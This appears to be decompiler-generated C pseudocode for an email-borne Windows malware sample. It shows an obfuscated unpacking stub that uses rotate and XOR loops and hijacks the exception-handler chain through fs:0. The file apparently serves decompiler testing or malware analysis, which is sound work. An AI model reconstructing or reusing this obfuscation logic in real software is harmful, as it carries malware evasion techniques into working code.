// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_1267/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn0040119E(word32 ebp, word32 esi, selector fs)
{
	word32 ebp_7;
	word32 esi_8;
	byte dl_9;
	word32 eax_10 = fn004011AD(ebp, esi, fs, dwLoc04, dwArg00, out ebp_7, out esi_8, out dl_9);
	byte al_11 = (byte) eax_10;
	Mem14[eax_10 + 0x00000000:byte] = Mem0[eax_10 + 0x00000000:byte] + al_11;
	Mem16[eax_10 + 0x00000000:byte] = Mem14[eax_10 + 0x00000000:byte] + al_11;
	Mem18[eax_10 + 0x00000000:byte] = Mem16[eax_10 + 0x00000000:byte] + dl_9;
	Mem22[eax_10 + 0x00000000:byte] = Mem18[eax_10 + 0x00000000:byte] + al_11;
	word32 ebp_24;
	word32 esi_25;
	byte dl_26;
	fn004011AD(ebp_7, esi_8, fs, dwLoc04, dwArg00, out ebp_24, out esi_25, out dl_26);
	return;
}

word32 fn004011AD(word32 ebp, word32 esi, selector fs, word32 dwArg00, word32 dwArg04, ptr32 ebpOut, ptr32 esiOut, ptr32 dlOut)
{
	__rol((word16) (DPB(esi, __ror(si, 0x01), 0, 16) << 0x00000014 >> 0x0000001B), 0x08);
	word32 eax_25 = (word32) Mem0[dwArg04 - 0xFFFFFFF8:byte];
	word32 esp_39 = fp + 0x00000004;
	word32 ecx_29 = __ror(dwArg00 - 0x00000001, 0x1B);
	word32 edx_33 = 0x00000000;
	word32 edx_42 = edx_33 + 0x00000090;
	word32 eax_48 = eax_25 - edx_42;
	word16 dx_43 = (word16) edx_42;
	word32 ecx_45 = ecx_29 + Mem0[esp_39 + 0x00000000:word32];
	byte al_49 = (byte) eax_48;
	word16 ax_50 = (word16) eax_48;
	while (eax_48 != 0x00000000)
	{
		Mem62[eax_48 + 0x00000000:byte] = Mem0[eax_48 + 0x00000000:byte] + al_49;
		ecx_29 = ecx_45 + ebp;
		byte cl_59 = (byte) ecx_29;
		Mem64[dwArg04 - 0xD1FFECF8:byte] = Mem62[dwArg04 - 0xD1FFECF8:byte] + cl_59;
		edx_33 = Mem64[esp_39 + 0x00000000:word32];
		Mem73[dwArg04 - 0x76FFFFD3:byte] = Mem64[dwArg04 - 0x76FFFFD3:byte] + cl_59;
		esp_39 = esp_39 + 0x00000004;
		eax_25 = DPB(eax_48, al_49 & 0x00, 0, 8);
		edx_42 = edx_33 + 0x00000090;
		eax_48 = eax_25 - edx_42;
		dx_43 = (word16) edx_42;
		ecx_45 = ecx_29 + Mem0[esp_39 + 0x00000000:word32];
		al_49 = (byte) eax_48;
		ax_50 = (word16) eax_48;
	}
	word32 edx_82 = DPB(edx_42, __ror(dx_43, 0x0A) + 0x0042, 0, 16);
	word32 esi_101 = Mem0[DPB(0x0012C143, ax_50, 0, 16):word32];
	__ror(edx_82 - 0xBB080ACD, 0x0F);
	word32 eax_96 = Mem0[0x004010B0:word32];
	word16 ax_98 = (word16) eax_96;
	do
		esi_101 = esi_101 + 0x00000001;
	while (Mem0[esi_101 + 0x00000000:word32] - eax_96 != 0x00000000);
	__rol(DPB(eax_96, __rol(ax_98, 0x0B), 0, 16), 0x17);
	word32 edx_130 = (word32) Mem0[esi_101 + 0xFFFFFFFD:word16];
	__ror((word16) (esi_101 << 0x00000019), 0x02);
	word32 edx_143 = Mem0[esp_39 + 0x00000000:word32];
	word32 eax_149 = Mem0[0x0040101E:word32];
	word32 edi_153 = __rol(0x0040101E, 0x1E);
	word16 di_154 = (word16) edi_153;
	word16 di_166 = di_154 + 0x0026;
	word32 esi_160 = Mem0[edx_143 + 0x00000000:word32];
	edx_143 = edx_143 + 0x00000001;
	word32 edi_167 = DPB(edi_153, di_166, 0, 16);
	while ((esi_160 ^ eax_149) != 0x00000000)
	{
		di_154 = __ror(di_166, 0x0C);
		edi_153 = DPB(edi_153, di_154, 0, 16);
		di_166 = di_154 + 0x0026;
		esi_160 = Mem0[edx_143 + 0x00000000:word32];
		edx_143 = edx_143 + 0x00000001;
		edi_167 = DPB(edi_153, di_166, 0, 16);
	}
	word32 esp_190 = esp_39 - 0x00000004;
	Mem191[esp_190 + 0x00000000:word32] = edx_130 + 0x003F878F;
	Mem199[esp_190 - 0x00000004:word32] = Mem191[fs:0x00000000:word32];
	word32 eax_202 = DPB(edx_130 + 0x003F878F, __rol((word16) (edx_130 + 0x003F878F), 0x0B), 0, 16);
	Mem204[esp_190 - 0x00000008:word32] = esp_190 - 0x00000008;
	Mem208[fs:0x00000000:word32] = Mem204[esp_190 - 0x00000008:word32];
	Mem212[esp_190 - 0x00000008:word32] = 0x00000000;
	Mem221[esp_190 - 0x0000000C:word32] = edx_143;
	word32 esi_188 = ~((esi_160 ^ 0x39D22F6D) * 0x00000002);
	word32 edi_192 = -edi_167;
	word32 esi_196;
	*esiOut = DPB(esi_188, (word16) esi_188 | 0x003B, 0, 16);
	word32 ebp_215;
	*ebpOut = DPB(edi_192, (word16) edi_192 + 0xFF8E, 0, 16);
	byte dl_224;
	*dlOut = 0x87;
	return (eax_202 ^ 0x68089825) + 0x47DB1D15;
}

